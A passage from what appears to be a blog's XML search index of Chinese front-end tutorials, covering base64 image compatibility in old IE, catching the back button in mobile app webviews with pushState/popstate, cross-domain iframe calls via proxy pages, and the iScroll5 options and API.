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--&gt;1234567891011121314151617181920212223242526&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="content-type" content="text/html; charset=GB2312" /&gt;&lt;meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" /&gt;&lt;title&gt;base64图片兼容性测试&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="useragent" style="width:200px;"&gt;&lt;/div&gt;&lt;div id="showimg" style="width:100px; height:100px; float:left; *background-image:expression('url(mhtml:' + location.href + '!showimg)');"&gt;&lt;/div&gt;&lt;div id="img2" style="width:100px; height:100px; float:left; *background-image:expression('url(mhtml:' + location.href + '!img2)');"&gt;&lt;/div&gt;&lt;script type="text/javascript"&gt;function setImage(obj) &#123;// for ie6、ie7、ie8if (!/Trident/.test(navigator.userAgent) &amp;amp;&amp;amp; /MSIE [6-8]\.0.*Windows NT 5\./.test(navigator.userAgent)) return "";//for ie9 or later、FireFox 、chrome 、Operavar html = document.firstChild.nodeValue;var reg = new RegExp("--imagedata\\s*[\\r\\n]+Content-Type:\\s*(image\\/\\w+)\s*[\\r\\n\\s]+Content-Location:\\s*" + obj + "\\s*Content-Transfer-Encoding:\\s*base64\\s*[\\r\\n\\s]+([a-zA-Z0-9\\/\\+\\r\\n=]+)", "g");var codePart = reg.exec(html);document.getElementById(obj).style.backgroundImage = "url(data:" + codePart[1] + ";base64," + codePart[2] + ")";&#125;setImage("showimg");setImage("img2");document.getElementById("useragent").innerHTML = navigator.userAgent;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;执行效果]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>Base64图片</tag>
        <tag>base64编码图片</tag>
        <tag>二进制图片解码</tag>
        <tag>图片编码解析浏览器的兼容性处理</tag>
        <tag>图片解码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[监听微信、支付宝等移动app及浏览器的返回、后退、上一页按钮的事件方法]]></title>
    <url>%2F2016%2F08%2F08%2F%E7%9B%91%E5%90%AC%E5%BE%AE%E4%BF%A1%E3%80%81%E6%94%AF%E4%BB%98%E5%AE%9D%E7%AD%89%E7%A7%BB%E5%8A%A8app%E5%8F%8A%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E8%BF%94%E5%9B%9E%E3%80%81%E5%90%8E%E9%80%80%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在实际的应用中，我们常常需要实现在移动app和浏览器中点击返回、后退、上一页等按钮实现自己的关闭页面、调整到指定页面或执行一些其它操作的需求，那在代码中怎样监听当点击微信、支付宝、百度糯米、百度钱包等app的返回按钮或者浏览器的上一页或后退按钮的事件呢。&emsp;&emsp;我相信很多朋友像我一样，在百度、搜狗里面搜索很久都没找到方法。下面就来告诉大家怎样监听的方法：首先我们要了解浏览器的history。大家知道在页面中我们可以使用javascript window history，后退到前面页面，但是由于安全原因javascript不允许修改history里已有的url链接，但可以使用pushState方法往history里增加url链接，并且提供popstate事件监测从history栈里弹出url。既然有提供popstate事件监测，那么我们就可以进行监听。返回、后退、上一页按钮点击监听实现代码：123window.addEventListener("popstate", function(e) &#123;alert("我监听到了浏览器的返回按钮事件啦");//根据自己的需求实现自己的功能&#125;, false);&emsp;&emsp;虽然我们监听到了后退事件，但是页面还是会返回上一个页面，所以我们需要使用pushState增加一个本页的url,代表本页，大家都非常清楚是#1234567function pushHistory() &#123; var state = &#123; title: "title", url: "#" &#125;; window.history.pushState(state, "title", "#");&#125;&emsp;&emsp;当进入该页面，我们就给这个history压入一个本地的连接。当点击返回、后退及上一页的操作时，就进行监听，在监听代码中实现自己操作。下面是完整的代码：12345678910111213$(function()&#123; pushHistory();window.addEventListener("popstate", function(e) &#123; alert("我监听到了浏览器的返回按钮事件啦");//根据自己的需求实现自己的功能&#125;, false);function pushHistory() &#123; var state = &#123; title: "title", url: "#" &#125;; window.history.pushState(state, "title", "#");&#125; &#125;);]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>监听微信后退</tag>
        <tag>监听微信返回</tag>
        <tag>监听支付宝后退</tag>
        <tag>监听支付宝返回</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iframe跨域通信相互访问方法]]></title>
    <url>%2F2016%2F08%2F03%2Fiframe%E8%B7%A8%E5%9F%9F%E9%80%9A%E4%BF%A1%E7%9B%B8%E4%BA%92%E8%AE%BF%E9%97%AE%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1.同域相互访问假设A.html 与 b.html domain都是localhost （同域）A.html中iframe 嵌入 B.html，name=myframeA.html有js function fMain()B.html有js function fIframe()需要实现 A.html 调用 B.html 的 fIframe()，B.html 调用 A.html 的 fMain()A.html1234567891011121314151617181920212223&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="content-type" content="text/html; charset=utf-8"&gt;&lt;title&gt; main window &lt;/title&gt;&lt;script type="text/javascript"&gt;// main js functionfunction fMain()&#123;alert('main function execute success');&#125;// exec iframe functionfunction exec_iframe()&#123;window.myframe.fIframe();&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;A.html main&lt;/p&gt;&lt;p&gt;&lt;input type="button" value="exec iframe function" onclick="exec_iframe()"&gt;&lt;/p&gt;&lt;iframe src="B.html" name="myframe" width="500" height="100"&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;B.html1234567891011121314151617181920212223&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="content-type" content="text/html; charset=utf-8"&gt;&lt;title&gt; iframe window &lt;/title&gt;&lt;script type="text/javascript"&gt;// iframe js functionfunction fIframe()&#123;alert('iframe function execute success');&#125;// exec main functionfunction exec_main()&#123;parent.fMain();&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;B.html iframe&lt;/p&gt;&lt;p&gt;&lt;input type="button" value="exec main function" onclick="exec_main()"&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;点击A.html 的 exec iframe function button，执行成功，弹出iframe function execute success。如下图点击B.html 的 exec main function button，执行成功，弹出 main function execute success。如下图2.跨域互相访问假设A.html domain是 localhost，B.html domain 是 127.0.0.1 （跨域）这里使用 localhost 与 127.0.0.1只是方便测试，localhost与127.0.0.1已经不同一个域，因此执行效果是一样的。实际使用时换成 www.domaina.com 与 www.domainb.com 即可。A.html中iframe 嵌入 B.html，name=myframeA.html有js function fMain()B.html有js function fIframe()需要实现 A.html 调用 B.html 的 fIframe()，B.html 调用A.html 的 fMain() （跨域调用）如果使用上面同域的方法，浏览器判断A.html 与 B.html 不同域，会有错误提示。Uncaught SecurityError: Blocked a frame with origin “http://localhost“ from accessing a frame with origin “http://127.0.0.1“. Protocols, domains, and ports must match.实现原理：因为浏览器为了安全，禁止了不同域访问。因此只要调用与执行的双方是同域则可以相互访问。首先，A.html 如何调用B.html的 fIframe方法1.在A.html 创建一个 iframe2.iframe的页面放在 B.html 同域下，命名为execB.html3.execB.html 里有调用B.html fIframe方法的js调用12345678parent.window.myframe.fIframe(); // execute parent myframe fIframe function``` 这样A.html 就能通过 execB.html 调用 B.html 的 fIframe 方法了。 同理，B.html 需要调用A.htmlfMain方法，需要在B.html 嵌入与A.html 同域的 execA.html execA.html 里有调用 A.html fMain 方法的js 调用```javascriptparent.parent.fMain(); // execute main function这样就能实现A.html与B.html跨域相互调用。A.html1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="content-type" content="text/html; charset=utf-8"&gt;&lt;title&gt; main window &lt;/title&gt;&lt;script type="text/javascript"&gt;// main js functionfunction fMain()&#123;alert('main function execute success');&#125;// exec iframe functionfunction exec_iframe()&#123;if(typeof(exec_obj)=='undefined')&#123;exec_obj = document.createElement('iframe');exec_obj.name = 'tmp_frame';exec_obj.src = 'http://127.0.0.1/execB.html';exec_obj.style.display = 'none';document.body.appendChild(exec_obj);&#125;else&#123;exec_obj.src = 'http://127.0.0.1/execB.html?' + Math.random();&#125;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;A.html main&lt;/p&gt;&lt;p&gt;&lt;input type="button" value="exec iframe function" onclick="exec_iframe()"&gt;&lt;/p&gt;&lt;iframe src="http://127.0.0.1/B.html" name="myframe" width="500" height="100"&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;B.html123456789101112131415161718192021222324252627282930&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="content-type" content="text/html; charset=utf-8"&gt;&lt;title&gt; iframe window &lt;/title&gt;&lt;script type="text/javascript"&gt;// iframe js functionfunction fIframe()&#123;alert('iframe function execute success');&#125;// exec main functionfunction exec_main()&#123;if(typeof(exec_obj)=='undefined')&#123;exec_obj = document.createElement('iframe');exec_obj.name = 'tmp_frame';exec_obj.src = 'http://localhost/execA.html';exec_obj.style.display = 'none';document.body.appendChild(exec_obj);&#125;else&#123;exec_obj.src = 'http://localhost/execA.html?' + Math.random();&#125;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;B.html iframe&lt;/p&gt;&lt;p&gt;&lt;input type="button" value="exec main function" onclick="exec_main()"&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;execA.html123456789101112&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="content-type" content="text/html; charset=utf-8"&gt;&lt;title&gt; exec main function &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type="text/javascript"&gt;parent.parent.fMain(); // execute main function&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;execB.html123456789101112&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="content-type" content="text/html; charset=utf-8"&gt;&lt;title&gt; exec iframe function &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type="text/javascript"&gt;parent.window.myframe.fIframe(); // execute parent myframe fIframe function&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;执行如下图：DEMO下载]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>iframe跨域</tag>
        <tag>iframe相互访问</tag>
        <tag>iframe访问主框架</tag>
        <tag>iframe跨域通信</tag>
        <tag>iframe通信</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IScroll5用法详解(中文API整理)]]></title>
    <url>%2F2016%2F07%2F30%2Fiscroll5%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3%E4%B8%AD%E6%96%87api%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[IScroll是移动页面上被使用的一款仿系统滚动插件。IScroll5相对于之前的IScroll4改进了许多，使得大家可以更方便的定制所需的功能了。为了便于大家理解学习应用IScroll5，在这里做了一下总结和详解。iscroll官网：http://iscrolljs.com/iscroll中文API：http://demo.grycheng.com/case/iscrollapi.html版本针对iScroll的优化。为了达到更高的性能，iScroll5分为了多个版本。你可以选择最适合你的版本。目前我们有以下版本：iscroll.js，这个版本是常规应用的脚本。它包含大多数常用的功能，有很高的性能和很小的体积。iscroll-lite.js，精简版本。它不支持快速跳跃，滚动条，鼠标滚轮，快捷键绑定。但如果你所需要的是滚动(特别是在移动平台) iScroll 精简版 是又小又快的解决方案。iscroll-probe.js，探查当前滚动位置是一个要求很高的任务,这就是为什么我决定建立一个专门的版本。如果你需要知道滚动位置在任何给定的时间,这是iScroll给你的。（我正在做更多的测试,这可能最终在常规iscroll.js脚本，请留意）。iscroll-zoom.js，在标准滚动功能上增加缩放功能。iscroll-infinite.js，可以做无限缓存的滚动。处理很长的列表的元素为移动设备并非易事。 iScroll infinite版本使用缓存机制,允许你滚动一个潜在的无限数量的元素。入门IScroll是一个类，每个需要使用滚动功能的区域均要进行初始化。每个页面上的iScroll实例数目在设备的CPU和内存能承受的范围内是没有限制的。尽可能保持DOM结构的简洁。iScroll使用硬件合成层但是有一个限制硬件可以处理的元素。最佳最简单的HTML结构如下：1234567&lt;div id="wrapper"&gt;&lt;ul&gt;&lt;li&gt;...&lt;/li&gt;&lt;li&gt;...&lt;/li&gt;...&lt;/ul&gt;&lt;/div&gt;iScroll作用于滚动区域的外层。在上面的例子中，UL元素能进行滚动。只有容器元素的第一个子元素能进行滚动，其他子元素完全被忽略。初始化iscroll：1var myScroll = new IScroll('#wrapper',options);初始化设置使用实例：1234var myScroll = new IScroll('#wrapper', &#123;mouseWheel: true,scrollbars: true&#125;);初始化当DOM准备完成后iScroll需要被初始化。最保险的方式是在window的onload事件中启动它。在DOMContentLoaded事件中或者inline initialization中做也可以，需要记住的是脚本需要知道滚动区域的高度和宽度。如果你有一些图片在滚动区域导致不能立马获取区域的高度和宽度，iScroll的滚动尺寸有可能会错误。为滚动起容器增加position:relative或者absolute样式。这将解决大多数滚动器容器大小计算不正确的问题。综上所述，最小的iScroll配置如下：1234567891011121314151617181920&lt;head&gt;...&lt;script type="text/javascript" src="iscroll.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;var myScroll;function loaded() &#123;myScroll = new IScroll(‘#wrapper‘);&#125;&lt;/script&gt;&lt;/head&gt;...&lt;body onload="loaded()"&gt;&lt;div id="wrapper"&gt;&lt;ul&gt;&lt;li&gt;...&lt;/li&gt;&lt;li&gt;...&lt;/li&gt;...&lt;/ul&gt;&lt;/div&gt;&lt;/body&gt;如果你有一个复杂的DOM结构，最好在onload事件之后适当的延迟，再去初始化iScroll。最好给浏览器100或者200毫秒的间隙再去初始化iScroll。配置在iScroll初始化阶段可以通过构造函数的第二个参数配置它。1234var myScroll = new IScroll(‘#wrapper‘, &#123;mouseWheel: true,scrollbars: true&#125;);上面的例子示例了在iScroll初始化时开启鼠标滚轮支持和滚动条支持。在初始化后你可以通过options对象访问标准化值。例如： js console.dir(myScroll.options);上面的语句将返回myScroll实例的配置信息。所谓的标准化意味着如果你设置useTransform:true，但是浏览器并不支持CSS transforms，那么useTransform属性值将为false。理解核心iScroll使用基于设备和浏览器性能的各种技术来进行滚动。通常不需要你来配置引擎，iScroll会为你选择最佳的方式。尽管如此，理解iScroll工作机制和了解如何去配置他们也是很重要的。options.useTransform默认情况下引擎会使用CSStransform属性。如果现在还是2007年，那么可以设置这个属性为false，这就是说：引擎将使用top/left属性来进行滚动。这个属性在滚动器感知到Flash，iframe或者视频插件内容时会有用，但是需要注意：性能会有极大的损耗。默认值：trueoptions.useTransitioniScroll使用CSS transition来实现动画效果（动量和弹力）。如果设置为false，那么将使用requestAnimationFrame代替。在现在浏览器中这两者之间的差异并不明显。在老的设备上transitions执行得更好。默认值：trueoptions.HWCompositing这个选项尝试使用translateZ(0)来把滚动器附加到硬件层，以此来改变CSS属性。在移动设备上这将提高性能，但在有些情况下,你可能想要禁用它(特别是如果你有太多的元素和硬件性能跟不上)。默认值：true如果不确定iScroll的最优配置。从性能角度出发，上面的所有选项应该设置为true。（或者更好的方式，让他们自动设置属性为true）。你可以尝试这配置他们，但是要小心内存泄漏。基本功能options.bounce当滚动器到达容器边界时他将执行一个小反弹动画。在老的或者性能低的设备上禁用反弹对实现平滑的滚动有帮助。默认值：trueoptions.click为了重写原生滚动条，iScroll禁止了一些默认的浏览器行为，比如鼠标的点击。如果你想你的应用程序响应click事件，那么该设置次属性为true。请注意，建议使用自定义的tap 事件来代替它（见下面）。默认属性：falseoptions.disableMouseoptions.disablePointeroptions.disableTouch默认情况下，iScroll监听所有的指针事件，并且对这些事件中第一个被触发的做出反应。这看上去是浪费资源，但是在大量的浏览器/设备上兼容，特定的事件侦测证明是无效的，所以listen-to-all是一个安全的做法。如果你有一种设备侦测的内部机制，或者你知道你的脚本将在什么地方运行，你可以把你不需要的事件禁用（鼠标，指针或者触摸事件）。下面的例子是禁用鼠标和指针事件：1234var myScroll = new IScroll(‘#wrapper‘, &#123;disableMouse: true,disablePointer: true&#125;);默认值：falseoptions.eventPassthrough有些时候你想保留原生纵向的滚动条但想为横向滚动条增加iScroll功能（比如走马灯）。设置这个属性为true并且iScroll区域只将影响横向滚动，纵向滚动将滚动整个页面。在移动设备上访问event passthrough demo。注意，这个值也可以设置为horizontal，其作用和上面介绍的相反（横向滚动条保持原生，纵向滚动条使用iScroll）。options.freeScroll此属性针对于两个两个纬度的滚动条（当你需要横向和纵向滚动条）。通常情况下你开始滚动一个方向上的滚动条，另外一个方向上会被锁定不动。有些时候，你需要无约束的移动（横向和纵向可以同时响应），在这样的情况下此属性需要设置为true。请参考 2D scroll demo。默认值：falseoptions.keyBindings此属性为true时激活键盘（和远程控制）绑定。请参考下面的Key bindings内容。默认值：falseoptions.invertWheelDirection当鼠标滚轮支持激活后，在有些情况下需要反转滚动的方向。（比如，鼠标滚轮向下滚动条向上，反之亦然）。默认值：falseoptions.momentum在用户快速触摸屏幕时，你可以开/关势能动画。关闭此功能将大幅度提升性能。默认值：trueoptions.mouseWheel侦听鼠标滚轮事件。默认值：falseoptions.preventDefault当事件触发时师傅执行preventDefault()。此属性应该设置为true，除非你真的知道你需要怎么做。请参考下面的Advancedfeatures中的preventDefaultException，可以获取更多控制preventDefault行为的信息。默认值：trueoptions.scrollbars是否显示为默认的滚动条。更多信息请查看Scrollbar默认值：falseoptions.scrollXoptions.scrollY默认情况下只有纵向滚动条可以使用。如果你需要使用横向滚动条，需要将scrollX 属性值设置为 true。请参考示例horizontal demo。也可以参考freeScroll选项。默认值：scrollX: false，scrollY: true注意属性 scrollX/Y: true 与overflow: auto有相同的效果。设置一个方向上的值为 false 可以节省一些检测的时间和CPU的计算周期。options.startXoptions.startY默认情况下iScroll从0, 0 (top left)位置开始，通过此属性可以让滚动条从不同的位置开始滚动。默认值：0options.tap设置此属性为true，当滚动区域被点击或者触摸但并没有滚动时，可以让iScroll抛出一个自定义的tap事件。这是处理与可以点击元素之间的用户交互的建议方式。侦听tap事件和侦听标准事件的方式一致。示例如下：12element.addEventListener(‘tap‘, doSomething, false); \\ Native$(‘#element‘).on(‘tap‘, doSomething); \\ jQuery你可以通过传递一个字符串来自定义事件名称。比如：1tap: ‘myCustomTapEvent‘在这个示例里你应该侦听名为myCustomTapEvent的事件。默认值：false滚动条滚动条不只是像名字所表达的意义一样，在内部它们是作为indicators的引用。一个指示器侦听滚动条的位置并且现实它在全局中的位置，但是它可以做更多的事情。先从最基本的开始。options.scrollbars正如我们在基本功能介绍中提到的，激活滚动条只需要做一件事情，这件事情就是：123var myScroll = new IScroll(‘#wrapper‘, &#123;scrollbars: true&#125;);当然这个默认的行为是可以定制的。options.fadeScrollbars不想使用滚动条淡入淡出方式时，需要设置此属性为false以便节省资源。默认值：falseoptions.interactiveScrollbars此属性可以让滚动条能拖动，用户可以与之交互。默认值：falseoptions.resizeScrollbars滚动条尺寸改变基于容器和滚动区域的宽/高之间的比例。此属性设置为false让滚动条固定大小。这可能有助于自定义滚动条样式（参考下面的滚动条样式）。默认值：trueoptions.shrinkScrollbars当在滚动区域外面滚动时滚动条是否可以收缩到较小的尺寸。有效的值为：clip 和 scale。clip是移动指示器到它容器的外面，效果就是滚动条收缩起来，简单的移动到屏幕以外的区域。属性设置为此值后将大大的提升整个iScroll的性能。scale是关闭属性useTransition，之后所有的动画效果将使用requestAnimationFrame实现。指示器实际上有各种尺寸，并且最终的效果最好。默认值：false注意改变大小不是在GPU上执行的，所以‘scale‘ 是在CPU上执行。滚动条样式如果你不喜欢默认的滚动条样式，而且你认为你可以做的更好，你可以自定义滚动条样式。第一步就是设置选项scrollbars的值为custom：123var myScroll = new IScroll(‘#wrapper‘, &#123;scrollbars: ‘custom‘&#125;);使用下面的CSS类可以简单的改变滚动条样式。.iScrollHorizontalScrollbar，这个样式应用到横向滚动条的容器。这个元素实际上承载了滚动条指示器。.iScrollVerticalScrollbar，和上面的样式类似，只不过适用于纵向滚动条容器。.iScrollIndicator，真正的滚动条指示器。.iScrollBothScrollbars，这个样式将在双向滚动条显示的情况下被加载到容器元素上。通常情况下其中一个（横向或者纵向）是可见的如果你设置resizeScrollbars: false，滚动条将是固定大小，否则它将基于滚动区域的尺寸变化。指示上面所有关于滚动条的选项实际上是包装了一个底层的选项indicators。它看起来或多或少像这样：1234567891011121314var myScroll = new IScroll(‘#wrapper‘, &#123;indicators: &#123;el: [element|element selector]fade: false,ignoreBoundaries: false,interactive: false,listenX: true,listenY: true,resize: true,shrink: false,speedRatioX: 0,speedRatioY: 0,&#125;&#125;);options.indicators.el这是一个强制性的参数，它保留了指向滚动条容器元素的引用。容器里的第一个子元素就是指示器。有效的语法如下：123indicators: &#123;el: document.getElementById(‘indicator‘)&#125;更简单的方式：123indicators: &#123;el: ‘#indicator‘&#125;注意，滚动条可以在你的文档的任意地方，它不需要在滚动条包装器内。options.indicators.ignoreBoundaries这个属性是告诉指示器忽略它容器所带来的边界。当我们能改变滚动条速度的比率，在让滚动条滚动时这个属性很有用。比如你想让指示器是滚动条速度的两倍，指示器将很快到达它的结尾。这个属性被用在视差滚动。默认值：falseoptions.indicators.listenXoptions.indicators.listenY指示器的那一个轴（横向和纵向）被侦听。可以设置一个或者都设置默认值：trueoptions.indicators.speedRatioXoptions.indicators.speedRatioY指示器移动的速度和主要滚动条大小的关系。默认情况下是设置为自动。你很少需要去改变这个值。默认值：0options.indicators.fadeoptions.indicators.interactiveoptions.indicators.resizeoptions.indicators.shrink这几个选项和我们已经介绍过的滚动条中的一样，在这里不重复介绍。请参考迷你地图示例，你将体验indicators选项的神奇力量。你应该已经注意到选项indicators是复数，是的，实际上，传递一个对象数组你可以得到一个虚拟的无限大小的指示器。我不知道你是否需要，但是，这里我是想你介绍参数设置，所以要提及此。视差滚动视差滚动是指示器功能的一个 附属功能指示器是一个遵循主滚动条移动和动画的层。如果你了解它你就会理解这个功能背后的力量。增加这个功能你就可以创建任意数量的指示器和视差滚动。请参考 视差滚动示例.滚动的编程接口当然还可以通过编程来进行滚动。scrollTo(x, y, time, easing)对应存在的一个叫做myScroll的iScroll实例，可以通过下面的方式滚动到任意的位置：myScroll.scrollTo(0, -100)通过上面的方式将向下滚动100个像素。记住：0永远是左上角。需要滚动你必须传递负数。time 和 easing是可选项。他们控制滚动周期（毫秒级别）和动画的擦除效果。擦除功能是一个有效的IScroll.utils.ease对象。例如应用一个一秒的经典擦除动画你应该这么做：myScroll.scrollTo(0, -100, 1000, IScroll.utils.ease.elastic)擦除动画的类型选项有：quadratic, circular, back, bounce, elastic。scrollBy(x, y, time, easing)和上面一个方法类似，但是可以传递X和Y的值从当前位置进行滚动。myScroll.scrollBy(0, -10)上面这个语句将在当前位置向下滚动10个像素。如果你当前所在位置为-100，那么滚动结束后位置为-110.scrollToElement(el, time, offsetX, offsetY, easing)这是一个很有用的方法，你会喜欢它的。在这个方法中只有一个强制的参数就是el。传递一个元素或者一个选择器，iScroll将尝试滚动到这个元素的左上角位置。time是可选项，用于设置动画周期。offsetX 和 